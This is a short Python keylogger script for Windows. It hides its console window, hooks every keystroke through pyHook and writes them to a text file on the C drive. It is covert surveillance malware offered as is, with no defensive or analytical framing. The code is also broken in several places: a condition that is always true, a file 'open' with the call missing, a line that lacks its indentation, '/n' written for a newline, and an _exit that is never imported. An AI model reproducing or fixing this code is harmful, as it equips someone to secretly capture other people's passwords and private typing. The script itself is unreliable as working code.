

import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win , 0)


def OnKeyboardEvent(event):

	if event.Ascii==5:
		_exit(1)

	if event.Ascii != 0 or 8:

		f = open('c:\output.txt', 'r+') # Create the file on the C drive

		buffer = f.read()
		f.close() # Closes file when user stops typing 

		# Starts typing again
		# Open Output.txt to write current and new keystrokes

		f = ('c:\output.txt', 'w')

		keylogs = chr(event.Ascii)

		if event.Ascii == 13:

		keylogs = '/n'

		buffer += keylogs
		f.write(buffer)
		f.close()

# Create a hook for the manager object 

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent

# Set the hook
hm.HookKeyboard()

# Wait forever 
pythoncom.PumpMessages()
